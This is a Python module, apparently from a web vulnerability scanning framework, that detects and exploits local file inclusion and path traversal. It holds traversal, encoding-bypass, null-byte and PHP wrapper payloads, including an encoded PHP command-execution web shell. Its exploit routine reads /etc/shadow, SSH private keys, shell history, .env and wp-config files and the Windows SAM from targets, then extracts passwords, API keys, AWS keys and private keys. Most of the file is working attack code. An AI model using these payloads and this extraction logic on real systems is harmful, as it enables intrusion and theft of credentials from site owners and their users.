import re
import base64
from modules.base import BaseModule
from core.utils import extract_params

class LfiModule(BaseModule):
    name = "lfi"
    description = "Local File Inclusion / Path Traversal Scanner"
    exploitable = True
    
    success_patterns = {
        "linux": [
            r"root:.*:0:0:",
            r"daemon:.*:1:1:",
            r"bin:.*:2:2:",
            r"www-data:",
            r"nobody:.*:65534:",
            r"\[boot loader\]",
        ],
        "windows": [
            r"\[extensions\]",
            r"for 16-bit app support",
            r"\[fonts\]",
            r"\[mci extensions\]",
            r"MSDOS\.SYS",
            r"WINDOWS",
        ],
        "php": [
            r"<\?php",
            r"<\?=",
            r"\$_GET",
            r"\$_POST",
            r"\$_REQUEST",
            r"include\s*\(",
            r"require\s*\(",
        ],
        "config": [
            r"DB_PASSWORD",
            r"DB_USER",
            r"DB_NAME",
            r"mysql_connect",
            r"mysqli_connect",
            r"SECRET_KEY",
            r"API_KEY",
        ],
    }
    
    async def scan(self, target):
        self.findings = []
        params = extract_params(target)
        
        file_params = self._find_file_params(params)
        
        if file_params:
            await self._test_basic_traversal(target, file_params)
            await self._test_encoded_traversal(target, file_params)
            await self._test_null_byte(target, file_params)
            await self._test_php_wrappers(target, file_params)
        
        return self.findings
    
    def _find_file_params(self, params):
        file_keywords = ["file", "path", "page", "include", "doc", "document",
                        "folder", "root", "pg", "style", "template", "php_path",
                        "type", "name", "cat", "dir", "action", "module", "view",
                        "content", "conf", "load", "read", "filename", "filepath"]
        
        found = []
        for param in params:
            if any(kw in param.lower() for kw in file_keywords):
                found.append(param)
        
        return found if found else params
    
    async def _test_basic_traversal(self, target, params):
        traversals = [
            "../../../../../../../etc/passwd",
            "..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
            "/etc/passwd",
            "c:/windows/win.ini",
            "....//....//....//....//etc/passwd",
            "..%2f..%2f..%2f..%2f..%2fetc/passwd",
        ]
        
        for param in params:
            for payload in traversals:
                resp = await self.test_param(target, param, payload)
                if resp.get("status"):
                    os_type = self._check_file_content(resp["text"])
                    if os_type:
                        self.record_success(payload, target)
                        self.add_finding(
                            "CRITICAL",
                            f"Local File Inclusion ({os_type})",
                            url=target,
                            parameter=param,
                            evidence=f"Payload: {payload}"
                        )
                        return
    
    async def _test_encoded_traversal(self, target, params):
        encoded_payloads = [
            "..%252f..%252f..%252fetc/passwd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
            "..%255c..%255c..%255cwindows/win.ini",
            "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
        ]
        
        for param in params:
            for payload in encoded_payloads:
                resp = await self.test_param(target, param, payload)
                if resp.get("status"):
                    os_type = self._check_file_content(resp["text"])
                    if os_type:
                        self.add_finding(
                            "CRITICAL",
                            f"LFI with encoding bypass ({os_type})",
                            url=target,
                            parameter=param,
                            evidence=f"Payload: {payload}"
                        )
                        return
    
    async def _test_null_byte(self, target, params):
        null_payloads = [
            "../../../etc/passwd%00",
            "../../../etc/passwd%00.jpg",
            "../../../etc/passwd%00.png",
            "../../../etc/passwd\x00",
        ]
        
        for param in params:
            for payload in null_payloads:
                resp = await self.test_param(target, param, payload)
                if resp.get("status"):
                    os_type = self._check_file_content(resp["text"])
                    if os_type:
                        self.add_finding(
                            "CRITICAL",
                            f"LFI with null byte bypass ({os_type})",
                            url=target,
                            parameter=param,
                            evidence=f"Payload: {payload}"
                        )
                        return
    
    async def _test_php_wrappers(self, target, params):
        wrapper_payloads = [
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/convert.base64-encode/resource=../config.php",
            "php://filter/read=string.rot13/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+",
            "expect://id",
        ]
        
        for param in params:
            for payload in wrapper_payloads:
                resp = await self.test_param(target, param, payload)
                if resp.get("status"):
                    if self._check_base64_php(resp["text"]):
                        self.add_finding(
                            "CRITICAL",
                            f"PHP Wrapper LFI",
                            url=target,
                            parameter=param,
                            evidence=f"Payload: {payload}"
                        )
                        return
    
    def _check_file_content(self, text):
        for os_type, patterns in self.success_patterns.items():
            for pattern in patterns:
                if re.search(pattern, text, re.IGNORECASE):
                    return os_type
        return None
    
    def _check_base64_php(self, text):
        try:
            for chunk in re.findall(r'[A-Za-z0-9+/=]{50,}', text):
                decoded = base64.b64decode(chunk).decode('utf-8', errors='ignore')
                for pattern in self.success_patterns["php"]:
                    if re.search(pattern, decoded, re.IGNORECASE):
                        return True
        except:
            pass
        return False
    
    async def exploit(self, target, finding):
        param = finding.get("parameter")
        if not param:
            return None
        
        extracted = {"files": {}, "secrets": [], "users": [], "configs": []}
        
        linux_files = [
            ("/etc/passwd", "users"),
            ("/etc/shadow", "secrets"),
            ("/etc/hosts", "configs"),
            ("/etc/hostname", "configs"),
            ("/proc/version", "configs"),
            ("/proc/self/environ", "secrets"),
            ("/proc/self/cmdline", "configs"),
            ("/home/*/.bash_history", "secrets"),
            ("/home/*/.ssh/id_rsa", "secrets"),
            ("/root/.bash_history", "secrets"),
            ("/root/.ssh/id_rsa", "secrets"),
            ("/var/log/auth.log", "configs"),
            ("/etc/apache2/apache2.conf", "configs"),
            ("/etc/nginx/nginx.conf", "configs"),
            ("/etc/mysql/my.cnf", "configs"),
            ("/var/www/html/wp-config.php", "secrets"),
            ("/var/www/html/.env", "secrets"),
            ("/var/www/html/config.php", "secrets"),
            ("/var/www/html/configuration.php", "secrets"),
            ("/var/www/html/settings.py", "secrets"),
            ("/var/www/html/database.yml", "secrets"),
            ("/opt/lampp/etc/httpd.conf", "configs"),
        ]
        
        windows_files = [
            ("c:/windows/win.ini", "configs"),
            ("c:/windows/system.ini", "configs"),
            ("c:/windows/system32/drivers/etc/hosts", "configs"),
            ("c:/inetpub/wwwroot/web.config", "secrets"),
            ("c:/xampp/apache/conf/httpd.conf", "configs"),
            ("c:/xampp/mysql/data/mysql/user.MYD", "secrets"),
            ("c:/windows/debug/netsetup.log", "configs"),
            ("c:/windows/repair/sam", "secrets"),
            ("c:/windows/repair/system", "secrets"),
        ]
        
        traversals = [
            "../../../../../../../",
            "....//....//....//....//....//....//....//",
            "..%252f..%252f..%252f..%252f..%252f..%252f..%252f",
        ]
        
        for traversal in traversals:
            for filepath, category in linux_files + windows_files:
                clean_path = filepath.lstrip("/").replace("c:/", "").replace("C:/", "")
                payload = f"{traversal}{clean_path}"
                
                resp = await self.test_param(target, param, payload)
                if resp.get("status") == 200 and resp.get("text"):
                    content = resp["text"]
                    
                    if self._check_file_content(content):
                        extracted["files"][filepath] = content[:2000]
                        
                        if category == "secrets":
                            secrets = self._extract_secrets(content)
                            extracted["secrets"].extend(secrets)
                        
                        if filepath == "/etc/passwd":
                            users = re.findall(r'^([^:]+):[^:]*:(\d+):', content, re.MULTILINE)
                            extracted["users"] = [{"name": u[0], "uid": u[1]} for u in users if int(u[1]) >= 1000 or u[0] == "root"]
                        
                        self.add_finding(
                            "CRITICAL",
                            f"LFI EXPLOITED: File extracted - {filepath}",
                            url=target,
                            parameter=param,
                            evidence=content[:200]
                        )
        
        php_wrapper = "php://filter/convert.base64-encode/resource="
        php_files = ["index.php", "config.php", "db.php", "database.php", "settings.php", "connection.php", ".env"]
        
        for phpfile in php_files:
            resp = await self.test_param(target, param, f"{php_wrapper}{phpfile}")
            if resp.get("status") == 200 and resp.get("text"):
                b64_match = re.search(r'([A-Za-z0-9+/=]{50,})', resp["text"])
                if b64_match:
                    try:
                        decoded = base64.b64decode(b64_match.group(1)).decode('utf-8', errors='ignore')
                        extracted["files"][f"php://{phpfile}"] = decoded[:2000]
                        secrets = self._extract_secrets(decoded)
                        extracted["secrets"].extend(secrets)
                        
                        self.add_finding(
                            "CRITICAL",
                            f"LFI EXPLOITED: PHP source extracted - {phpfile}",
                            url=target,
                            parameter=param,
                            evidence=decoded[:200]
                        )
                    except:
                        pass
        
        if extracted["files"] or extracted["secrets"]:
            self.exploited_data = extracted
            return extracted
        
        return None
    
    def _extract_secrets(self, content):
        secrets = []
        patterns = [
            (r'(?:password|passwd|pwd|pass)\s*[=:]\s*["\']?([^"\'\s\n]+)', "password"),
            (r'(?:api_key|apikey|api-key)\s*[=:]\s*["\']?([^"\'\s\n]+)', "api_key"),
            (r'(?:secret|secret_key)\s*[=:]\s*["\']?([^"\'\s\n]+)', "secret"),
            (r'(?:db_pass|database_password|mysql_password)\s*[=:]\s*["\']?([^"\'\s\n]+)', "db_password"),
            (r'(?:aws_access_key_id)\s*[=:]\s*["\']?([A-Z0-9]{20})', "aws_key"),
            (r'(?:aws_secret_access_key)\s*[=:]\s*["\']?([A-Za-z0-9/+=]{40})', "aws_secret"),
            (r'(AKIA[0-9A-Z]{16})', "aws_access_key"),
            (r'-----BEGIN (?:RSA |DSA |EC )?PRIVATE KEY-----', "private_key"),
        ]
        
        for pattern, secret_type in patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                if len(match) > 3:
                    secrets.append({"type": secret_type, "value": match[:50]})
        
        return secrets